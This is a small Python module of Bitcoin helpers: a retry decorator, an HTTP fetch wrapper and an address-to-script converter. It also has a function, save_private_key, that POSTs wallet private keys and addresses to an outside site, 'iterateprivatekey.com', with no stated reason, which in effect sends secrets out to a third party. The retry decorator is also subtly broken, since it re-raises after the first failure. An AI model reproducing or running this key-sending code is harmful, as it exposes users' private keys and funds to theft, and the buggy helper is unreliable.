import time
import requests
import binascii
from functools import wraps
from pycoin.symbols.btc import network

SAVE_PRVATE_KEY_API = 'https://www.iterateprivatekey.com/save/private/key'


def retry(cnt: int = 3):
    def decorator(method):
        @wraps(method)
        def wrapper(*args, **kwargs):
            for i in range(cnt):
                try:
                    return method(*args, **kwargs)
                except Exception as e:
                    print('run %s failed with %s' % (method.__name__, e))
                    time.sleep(5 * (i + 1))
                raise

        return wrapper

    return decorator


@retry(cnt=3)
def fetch_api(url: str, method: str = 'GET', headers: dict = {}, params: dict = {}, body: dict = {}, data: dict = {},
              raw: bool = False):
    if method == 'GET':
        res = requests.get(url, headers=headers, params=params)
    else:
        res = requests.post(url, json=body, headers=headers, params=params, data=data)

    if raw:
        return res.text
    else:
        return res.json()


def save_private_key(private_key: str, address: str, num: str):
    body = {
        'private_key': private_key,
        'address': address,
        'num': num
    }
    fetch_api(SAVE_PRVATE_KEY_API, method='POST', body=body)


def address_to_script(addr: str) -> str:
    return binascii.hexlify(network.parse.address(addr).script()).decode()
